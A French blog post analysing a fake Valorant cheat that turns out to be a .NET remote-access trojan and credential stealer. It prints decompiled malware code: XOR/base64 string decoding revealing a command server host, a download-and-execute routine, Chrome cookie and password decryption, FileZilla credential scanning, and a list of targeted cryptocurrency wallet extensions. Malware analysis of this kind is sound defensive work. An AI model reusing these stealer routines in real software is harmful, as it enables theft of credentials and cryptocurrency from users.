---
title: "Malware Analysis d'un Fake Cheat"
date: 2021-11-25T12:00:00Z
description: "Voici comment j'ai reverse un malware RAT"
categories: ["malware-analysis"]
tags: ["reverse", "virus", ".net"]
keywords: ["tuto", "reverse", "dotnet", ".net", "rat", "malware", "virus", "remote execution"]
---
[//]: <> (Created By Vozec 25/11/2021)
---
## Introduction

Je suis tombé sur ce prétendu Cheat Valorant et j'ai décidé de l'analyser.
Voici le fichier : [ici](./files/Do_Not_Execute)
Attention à ne pas l'exécuter !

## Commencement
Après avoir téléchargé le .exe, je lui supprime tout de suite son extension *.exe* pour éviter de le lancer par erreur en cliquant dessus.

Je lance DetectItEasy et je me rends compte qu'il est compilé en .Net

![All text](./img/die.png)

Je vais donc utiliser [Dnspy](https://github.com/dnSpy/dnSpy) pour explorer le code.
C'est un décompiler parfait pour ce langage, bien plus adapté ici que Ghidra ou IDA.

## Analyse des fonctions

Voici les fonctions présentes :
![All text](./img/fonctions.png)

Bon, c'est assez évident, mais on voit bien que ce n'est pas un cheat, on dirait plutôt un RAT...

On a ces fonctions bizarres :
- "DownloadAndExecute"
- "EndConnection"
- "FileZilla"
- "AllWallets"

![All text](./img/main.png)

Il y a une connexion TCP à la ligne 40 qui se fait en boucle puis qui attend une tâche à faire en permanence.

On peut aller voir la fonction : ``StringDecrypt`` :
```C
public static string Read(string b64, string stringKey)
{
  string result;
  try
  {
    if (string.IsNullOrWhiteSpace(b64))
    {
      result = string.Empty;
    }
    else
    {
      result = StringDecrypt.FromBase64(StringDecrypt.Xor(StringDecrypt.FromBase64(b64), stringKey));
    }
  }
  catch
  {
    result = b64;
  }
  return result;
}
```

C'est juste un décodage de la base64, un xor puis un second décodage en base64


```C
public static string Xor(string input, string stringKey)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < input.Length; i++)
		{
			stringBuilder.Append(Convert.ChangeType((int)(input[i] ^ stringKey[i % stringKey.Length]), TypeCode.Char));
		}
		return stringBuilder.ToString();
	}
  ```

Si on remonte la clé, on retrouve ce fichier :

```C
public static class Arguments
{
	public static string IP = "EgsrCgUlRiA8NkYRFjQNVy0dCUcWIQpVPiBPTg==";
	public static string ID = "Gi0jHDglRnsHU0IJEQkOVS83Bk8=";
	public static string Message = "ESEvGAQ2Hy0rJT4UKDQzFig0OwIRDDAGEQxLQwIiOwUFJUYgLCZKGDs0ehUCQC8CESYGXA==";
	public static string Key = "Keasars";
	public static int Version = 1;
}
```

La clé : **Keasars** nous permet de trouver les autres valeurs des strings :

- Message : "d3dx9_43.dll file not found or missing"
- Id : "@phantomas1448"
- IP : "brrundanitav.xyz:80"

On peut aller voir dans la class ``AES``
On voit beaucoup de MemoryStream, ect.

```C
private byte[] Get(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
{
  IntPtr intPtr = this.OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
  IntPtr hKey;
  IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
  byte[] array2;
  using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
  {
    byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
    int num = 0;
    if (this.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0) != 0U)
    {
      throw new CryptographicException();
    }
    array2 = new byte[num];
    uint num2 = this.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
    if (num2 == 3221266434U)
    {
      throw new CryptographicException();
    }
    if (num2 != 0U)
    {
      throw new CryptographicException();
    }
  }
  this.BCryptDestroyKey(hKey);
  Marshal.FreeHGlobal(hglobal);
  this.BCryptCloseAlgorithmProvider(intPtr, 0U);
  return array2;
}
```

Surement un *Ransomware*  ou juste une fonction pour chiffrer les fichiers de la victime ...

En cherchant encore plus loin, on trouve des strings très bizarre , celle-ci sont affichées ligne par ligne dans les listes . Comme ceci :
```C
new string(new char[]
					{
						'L',
						'o',
						'g',
						'i',
						'n',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
```

En cherchant et en jouant avec les listes présentes, j'ai trouvé ceci :

```
ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbg=
```
C'est évidemment de la base64 et une fois décodé, on obtient :
```bash
ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet
ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink
jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet
nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask
afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet
hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain
odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet
hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet
blnieiiffboillknjnepogjhkgnoapac|EqualWallet
cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty
fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet
kncchdigobghenbbaddojjnnaogfppfj|iWallet
amkmjjmmflddogmhpjloimipbofnfjih|Wombat
fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet
nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx
nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet
nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet
fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet
aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation
fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet
aeachknmefphepccionboohckonoeemg|Coin98Wallet
cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal
pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChainbase64
```

On a aussi, plus loin, des chemins d'accès avec par exemple : 'AppData/Roaming'
Combiné à toutes les class d'exécution de commandes comme :

```C
public bool Process(Entity6 updateTask)
	{
		try
		{
			string[] array = updateTask.Id2.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
			System.Diagnostics.Process.Start(new ProcessStartInfo
			{
				WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory.FullName,
				FileName = Environment.ExpandEnvironmentVariables(array[1])
			});
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
```
On comprend que ce n'est pas juste un RAT. Il y a aussi une partie du virus qui vole les sessions de certains site de cryptomonnaies en téléchargeant les fichiers locaux des clients Windows .

Par exemple, plus bas ce trouve une fonction du nom de : ``ScanPassword`` avec ``string chromeKey = EntityCreator.ReadKey(profilePath);``. Cette fonction regarde si dans la base de donnée , on retrouve des cookies de connections
avec ce genre de fonction :
```C
if (chiperText[0] == 'v' && chiperText[1] == '1')
	{
		result = global::Aes.Decrypt(Convert.FromBase64String(chromeKey), chiperText);
	}
	else
	{
		result = CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, null).Trim();
	}
  ```


	La class 'FileZilla' évoqué plus tôt fait ceci :
```C
private static List<Entity12> ScanCredentials(string Path)
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			XmlTextReader reader = new XmlTextReader(Path);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(reader);
			foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
			{
				Entity12 recent = FileZilla.GetRecent((XmlNode)obj);
				if (recent.Id1 != "UNKNOWN" && recent.Id1 != "UNKNOWN")
				{
					list.Add(recent);
				}
			}
		}
		catch
		{
		}
		return list;
	}
```
Elle scan un document XML ou les identifiants sont stockés .
Il y a la même chose pour voler les tokens discords .